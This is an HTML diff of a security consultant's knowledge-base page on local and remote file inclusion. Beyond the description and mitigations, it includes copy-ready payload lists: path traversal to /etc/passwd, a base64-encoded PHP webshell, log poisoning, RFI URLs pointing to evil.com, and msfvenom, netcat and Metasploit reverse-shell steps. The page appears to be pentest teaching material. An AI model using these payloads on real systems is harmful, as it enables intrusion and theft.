@@ -1,151 +1,333 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LFI/RFI | Web Security | Saikumar Raju</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
-    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
-    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
-    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
-    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
-    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
-    .logo span { color: var(--primary); }
-    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
-    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
-    .nav-links a:hover { color: var(--primary); }
-    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
-    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
-    .page-header { padding: 6rem 0 2rem; }
-    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
-    .breadcrumb a { color: var(--primary); text-decoration: none; }
-    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
-    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
-    .content-section { margin: 2rem 0; }
-    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
-    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
-    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
-    .copy-btn:hover { color: var(--primary); }
-    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
-    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
-    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
-    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
-    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } .payload-grid { grid-template-columns: 1fr; } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LFI & RFI: File Inclusion Vulnerabilities | Web Security | Saikumar Raju</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* === Base Styles (same as your other web pages) === */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+        body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+        .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+        .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+        .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+        .logo span { color: var(--primary); }
+        .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+        .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+        .nav-links a:hover { color: var(--primary); }
+        .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+        .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+        .page-header { padding: 6rem 0 2rem; }
+        .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+        .breadcrumb a { color: var(--primary); text-decoration: none; }
+        .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+        .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+        .content-section { margin: 2rem 0; }
+        .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+        .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+        .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+        .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+        .content-section li { margin-bottom: 0.5rem; }
+        .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+        .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+        .copy-btn:hover { color: var(--primary); }
+        .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+        .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+        .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+        .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+        footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+        .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+        .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+        .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+        @media (max-width: 768px) {
+            .container { padding: 0 1rem; }
+            .mobile-menu { display: block; }
+            .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+            .nav-links.show { display: flex; }
+            .page-header h1 { font-size: 1.8rem; }
+            .payload-grid { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
 <body>
 
 <nav class="navbar">
-  <div class="container nav-flex">
-    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
-    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
-    <ul class="nav-links" id="navLinks">
-      <li><a href="../index.html">Resume</a></li>
-      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
-      <li><a href="../blog.html">Write-ups</a></li>
-      <li><a href="../tools.html">Tools</a></li>
-      <li><a href="../index.html#contact">Contact</a></li>
-      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
-    </ul>
-  </div>
+    <div class="container nav-flex">
+        <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+        <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+        <ul class="nav-links" id="navLinks">
+            <li><a href="../index.html">Resume</a></li>
+            <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+            <li><a href="../status.html">Status</a></li>
+            <li><a href="../blog.html">Write-ups</a></li>
+            <li><a href="../tools.html">Tools</a></li>
+            <li><a href="../index.html#contact">Contact</a></li>
+            <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+        </ul>
+    </div>
 </nav>
 
 <main>
-  <div class="container">
-    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / LFI/RFI</div>
-    <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High Severity</span>
-      <h1>📌 LFI / RFI (Local/Remote File Inclusion)</h1>
-    </div>
+    <div class="container">
+        <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / LFI & RFI</div>
+        <div class="page-header">
+            <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High to Critical Severity</span>
+            <h1>📌 Local File Inclusion (LFI) & Remote File Inclusion (RFI) – Complete Guide</h1>
+            <p>A file inclusion vulnerability allows an attacker to include a file, usually exploiting a lack of proper input/output sanitization. This can lead to code execution, data theft, and website defacement.</p>
+        </div>
 
-    <div class="content-section">
-      <h2>🧠 Description</h2>
-      <p><strong>What is LFI/RFI?</strong></p>
-      <p>File Inclusion vulnerabilities allow attackers to include files on the server (LFI) or remote files (RFI). This can lead to arbitrary code execution, sensitive file disclosure, and full server compromise.</p>
-    </div>
+        <!-- ==================== DESCRIPTION & DIFFERENCES ==================== -->
+        <div class="content-section">
+            <h2>🧠 Description & Key Differences</h2>
+            <p>A File Inclusion vulnerability occurs when an application uses user-controlled input to dynamically include files without proper validation. It's often found in PHP applications using functions like `include()`, `require()`, `include_once()`, and `require_once()`.</p>
+            <h3>LFI vs RFI: Key Differences</h3>
+            <ul>
+                <li><strong>Local File Inclusion (LFI):</strong> The attacker includes a file already present on the target server. This can lead to reading sensitive files (e.g., `/etc/passwd`) or achieving Remote Code Execution (RCE) through techniques like log poisoning.</li>
+                <li><strong>Remote File Inclusion (RFI):</strong> The attacker includes a file hosted on a remote server. This allows them to execute arbitrary code on the target server directly. RFI requires the PHP setting `allow_url_include` to be `On`.</li>
+            </ul>
+        </div>
 
-    <div class="content-section">
-      <h2>💣 LFI Payloads</h2>
-      <div class="payload-grid">
-        <div class="payload-item">../../../../etc/passwd</div>
-        <div class="payload-item">..\..\..\..\windows\win.ini</div>
-        <div class="payload-item">/etc/passwd%00</div>
-        <div class="payload-item">/etc/passwd%2500</div>
-        <div class="payload-item">php://filter/convert.base64-encode/resource=index.php</div>
-        <div class="payload-item">php://filter/read=convert.base64-encode/resource=config</div>
-        <div class="payload-item">expect://id</div>
-        <div class="payload-item">file:///etc/passwd</div>
-        <div class="payload-item">zip://file.zip%23payload.php</div>
-        <div class="payload-item">phar://file.phar/test.txt</div>
-      </div>
+        <!-- ==================== CLASSIFICATION ==================== -->
+        <div class="content-section">
+            <h2>🏷️ Classification</h2>
+            <ul>
+                <li><strong>Type:</strong> File Inclusion (Injection)</li>
+                <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+                <li><strong>CWE:</strong> CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (RFI) / CWE-22: Improper Limitation of a Pathname to a Restricted Directory (LFI / Path Traversal)</li>
+            </ul>
+        </div>
 
-      <div class="payload-category">🌐 RFI Payloads</div>
-      <div class="payload-grid">
-        <div class="payload-item">http://attacker.com/shell.txt</div>
-        <div class="payload-item">https://attacker.com/shell.php</div>
-        <div class="payload-item">//attacker.com/shell</div>
-        <div class="payload-item">\\attacker.com\shell</div>
-      </div>
+        <!-- ==================== ATTACK SURFACE ==================== -->
+        <div class="content-section">
+            <h2>🎯 Attack Surface (Where to Test)</h2>
+            <ul>
+                <li>✅ Common vulnerable parameters: `?page=`, `?file=`, `?path=`, `?cat=`, `?dir=`, `?action=`, `?download=`, `?folder=`, `?view=`, `?content=`, `?layout=`, `?lang=`, `?template=`</li>
+                <li>✅ User-supplied filenames for downloads, templates, or language files</li>
+                <li>✅ Functions like `include`, `require`, `file_get_contents`, `fopen`</li>
+            </ul>
+        </div>
 
-      <div class="payload-category">💥 Log Poisoning (LFI to RCE)</div>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Access log poisoning
-GET /<?php system($_GET['cmd']); ?> HTTP/1.1
+        <!-- ==================== DETECTION METHODOLOGY ==================== -->
+        <div class="content-section">
+            <h2>🔍 Detection Methodology</h2>
+            <h3>1. Static Analysis (Source Code)</h3>
+            <ul>
+                <li>Search for file inclusion functions: `include()`, `require()`, `include_once()`, `require_once()`</li>
+                <li>Check if user-controlled parameters are passed directly to these functions</li>
+                <li>Look for missing input validation or sanitization</li>
+            </ul>
+            <h3>2. Dynamic Analysis (Burp Suite / Manual)</h3>
+            <ul>
+                <li>Identify a file inclusion parameter and try to read a sensitive local file like `/etc/passwd`</li>
+                <li>Observe the response for file contents or error messages</li>
+                <li>Use a remote URL (e.g., `http://attacker.com/shell.txt`) to test for RFI</li>
+            </ul>
+            <p><strong>Tools:</strong> Burp Suite, OWASP ZAP, Kadimus, LFISuite, Fimap, LFImap</p>
+        </div>
+
+        <!-- ==================== LFI PAYLOADS & TECHNIQUES ==================== -->
+        <div class="content-section">
+            <h2>💣 LFI – Basic & Bypass Techniques</h2>
+            <div class="payload-category">Basic LFI</div>
+            <div class="payload-grid">
+                <div class="payload-item">../../../etc/passwd</div>
+                <div class="payload-item">..\..\..\windows\win.ini</div>
+                <div class="payload-item">../../../../var/www/html/config.php</div>
+            </div>
+            <div class="payload-category">Null Byte (PHP < 5.3.4)</div>
+            <div class="payload-grid">
+                <div class="payload-item">../../../etc/passwd%00</div>
+                <div class="payload-item">../../../etc/passwd%00.jpg</div>
+            </div>
+            <div class="payload-category">Double URL Encoding</div>
+            <div class="payload-grid">
+                <div class="payload-item">%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</div>
+                <div class="payload-item">%252e%252e%252fetc%252fpasswd%00</div>
+            </div>
+            <div class="payload-category">UTF-8 Encoding</div>
+            <div class="payload-grid">
+                <div class="payload-item">%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</div>
+                <div class="payload-item">%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00</div>
+            </div>
+            <div class="payload-category">Path Truncation (filenames > 4096 bytes)</div>
+            <div class="payload-grid">
+                <div class="payload-item">../../../etc/passwd............[ADD MORE]</div>
+                <div class="payload-item">../../../etc/passwd/./././././.[ADD MORE]</div>
+            </div>
+            <div class="payload-category">Filter Bypass</div>
+            <div class="payload-grid">
+                <div class="payload-item">....//....//....//etc/passwd</div>
+                <div class="payload-item">..///////..////..//////etc/passwd</div>
+                <div class="payload-item">/%5C../%5C../%5C../%5C../etc/passwd</div>
+            </div>
+        </div>
+
+        <!-- ==================== PHP WRAPPERS (LFI to RCE) ==================== -->
+        <div class="content-section">
+            <h2>🐘 PHP Wrappers – Source Code Disclosure & RCE</h2>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># Read source code (Base64 encoded)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+
+# Zip wrapper (requires zip file upload)
+zip://path/to/file.zip%23rce.php
+
+# Phar wrapper
+phar://path/to/file.phar/test.txt
+
+# php://input (send POST data as code)
+curl -XPOST "http://example.com/?page=php://input" --data "&lt;?php system('id'); ?&gt;"
+
+# data:// wrapper (requires allow_url_include=On)
+http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</pre>
+            </div>
+        </div>
+
+        <!-- ==================== LOG POISONING (LFI to RCE) ==================== -->
+        <div class="content-section">
+            <h2>🔥 Log Poisoning – LFI to Remote Code Execution</h2>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># Step 1: Inject malicious PHP code into User-Agent
 User-Agent: <?php system($_GET['cmd']); ?>
 
-# Then include the log file
-../../../../var/log/apache2/access.log&cmd=id</pre>
-      </div>
-    </div>
+# Step 2: Include the log file
+?file=../../../../var/log/apache2/access.log&cmd=id
 
-    <div class="content-section">
-      <h2>⚙️ Exploitation Steps</h2>
-      <ol>
-        <li>Identify file inclusion parameter</li>
-        <li>Test LFI with /etc/passwd</li>
-        <li>If PHP, use wrappers (php://filter)</li>
-        <li>If RFI, include remote shell</li>
-        <li>Escalate via log poisoning or upload</li>
-      </ol>
-    </div>
+# Step 3: Execute commands via the injected parameter
+?file=../../../../var/log/apache2/access.log&cmd=whoami</pre>
+            </div>
+            <p><strong>Common log file paths:</strong></p>
+            <ul>
+                <li><code>/var/log/apache2/access.log</code></li>
+                <li><code>/var/log/apache2/error.log</code></li>
+                <li><code>/var/log/nginx/access.log</code></li>
+                <li><code>/var/log/nginx/error.log</code></li>
+                <li><code>/proc/self/environ</code> (if readable)</li>
+            </ul>
+        </div>
 
-    <div class="content-section">
-      <h2>🛡️ Mitigation</h2>
-      <div class="mitigation-box">
-        <strong>✅ Avoid including files from user input</strong><br>
-        <strong>✅ Use allowlist for allowed files</strong><br>
-        <strong>✅ Disable remote file inclusion (allow_url_include=Off)</strong><br>
-        <strong>✅ Sanitize input strictly</strong><br>
-        <strong>✅ Use chrooted environments</strong>
-      </div>
-    </div>
+        <!-- ==================== REMOTE FILE INCLUSION (RFI) ==================== -->
+        <div class="content-section">
+            <h2>🌍 Remote File Inclusion (RFI) – Advanced Exploitation</h2>
+            <p>RFI occurs when the application includes a remote file, typically via a URL. It requires the PHP setting <code>allow_url_include = On</code> and is often combined with the `allow_url_fopen = On` setting.</p>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># Basic RFI
+http://example.com/index.php?page=http://evil.com/shell.txt
 
-    <div class="content-section">
-      <h2>📚 References</h2>
-      <ul>
-        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" class="reference-link" target="_blank">PayloadsAllTheThings: File Inclusion</a></li>
-      </ul>
-    </div>
+# Null Byte (PHP < 5.3.4)
+http://example.com/index.php?page=http://evil.com/shell.txt%00
 
-    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
-  </div>
+# Double Encoding
+http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt</pre>
+            </div>
+            <h3>Reverse Shell via Netcat</h3>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># Generate PHP reverse shell payload
+msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.5 > shell.php
+
+# Host the payload on a local HTTP server
+python -m SimpleHTTPServer
+
+# Set up Netcat listener
+nc -lvp 4444
+
+# Include the remote payload
+http://example.com/index.php?page=http://192.168.0.5:8000/shell.php</pre>
+            </div>
+            <h3>RFI over Metasploit</h3>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre>msf > use exploit/unix/webapp/php_include
+set payload php/meterpreter/bind_tcp
+set RHOST 192.168.0.2
+set PATH /DVWA/vulnerabilities/fi/
+set HEADERS "Cookie: security=low; PHPSESSID=4536da6h54ski6ftv09gdq35ik"
+exploit</pre>
+            </div>
+            <h3>Bypassing Blacklists</h3>
+            <p>If a blacklist blocks `http://` or `https://`, try case variations like `HTTP://` or `hTTp://`.</p>
+            <h3>Null Byte Attack (Bypassing .php suffix)</h3>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># The server may append .php automatically. Use ? to neutralize it.
+http://example.com/index.php?page=http://evil.com/shell.txt?</pre>
+            </div>
+            <h3>Exploitation through SMB Server (Bypassing `allow_url_include`)</h3>
+            <p>If `allow_url_include` is `Off`, RFI can still be exploited on Windows targets using the SMB protocol.</p>
+            <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                <pre># Set up an SMB share with Impacket
+python smbserver.py -smb2support sharepath /root/Desktop/Shells
+
+# Include the remote file via SMB
+http://example.com/index.php?page=\\192.168.0.8\sharepath\shell.txt</pre>
+            </div>
+        </div>
+
+        <!-- ==================== TEST CASES ==================== -->
+        <div class="content-section">
+            <h2>🧪 Test Cases (STRICT)</h2>
+            <table class="test-cases">
+                <thead>
+                    <tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Inject <code>../../../etc/passwd</code></td><td>File content or error</td><td>/etc/passwd displayed</td></tr>
+                    <tr><td>2</td><td>Inject <code>%252e%252e%252fetc%252fpasswd</code></td><td>File content</td><td>Encoding bypass works</td></tr>
+                    <tr><td>3</td><td>Inject <code>../../../etc/passwd%00</code></td><td>File content</td><td>Null byte bypass (PHP < 5.3.4)</td></tr>
+                    <tr><td>4</td><td>PHP wrapper: <code>php://filter/convert.base64-encode/resource=index.php</code></td><td>Base64 source</td><td>Source code disclosure</td></tr>
+                    <tr><td>5</td><td>Inject <code>http://evil.com/shell.txt</code></td><td>Code execution</td><td>Remote File Inclusion</td></tr>
+                </tbody>
+            </table>
+            <p>✔ Must be reproducible</p>
+        </div>
+
+        <!-- ==================== MITIGATION ==================== -->
+        <div class="content-section">
+            <h2>🛡️ Mitigation</h2>
+            <div class="mitigation-box">
+                <strong>✅ Use allowlist of allowed files:</strong> Only permit specific filenames, never user-controlled paths.<br>
+                <strong>✅ Disable dangerous PHP settings:</strong> Set `allow_url_fopen = Off` and `allow_url_include = Off` in `php.ini`.<br>
+                <strong>✅ Sanitize user input:</strong> Remove `../`, `..\`, `%00`, and encoded variants before processing.<br>
+                <strong>✅ Use `realpath()` and `basename()`:</strong> Validate and normalize file paths before inclusion.<br>
+                <strong>✅ Store files outside the web root:</strong> Prevent direct access to sensitive files.<br>
+                <strong>✅ Run with least privilege:</strong> Use low-privileged users for web server processes.<br>
+                <strong>✅ Regular security audits:</strong> Scan for file inclusion vulnerabilities using automated tools.
+            </div>
+        </div>
+
+        <!-- ==================== REFERENCES ==================== -->
+        <div class="content-section">
+            <h2>📚 References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger – File Upload</a></li>
+                <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" class="reference-link" target="_blank" style="color: var(--primary);">OWASP – Path Traversal</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings – File Inclusion</a></li>
+                <li><a href="https://www.thehacker.recipes/ad/movement/lateral/rfi" class="reference-link" target="_blank" style="color: var(--primary);">The Hacker Recipes – RFI</a></li>
+                <li><a href="https://github.com/HarshRatheeOfficial/LFI-and-RFI-vulnerability" class="reference-link" target="_blank" style="color: var(--primary);">LFI and RFI vulnerability Lab</a></li>
+                <li><a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/" class="reference-link" target="_blank" style="color: var(--primary);">Acunetix – LFI</a></li>
+            </ul>
+        </div>
+
+        <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+    </div>
 </main>
 
-<footer><p>Saikumar Raju — Cybersecurity Consultant | LFI/RFI - Complete Guide</p></footer>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | LFI & RFI – Complete Guide</p></footer>
 
 <script>
-  const mobileBtn = document.getElementById('mobileMenuBtn');
-  const navLinks = document.getElementById('navLinks');
-  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
-  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
-  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+    // Mobile menu, dark mode, and copy code function (same as other pages)
+    const mobileBtn = document.getElementById('mobileMenuBtn');
+    const navLinks = document.getElementById('navLinks');
+    if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+    const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+    function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
 </script>
 </body>
 </html>
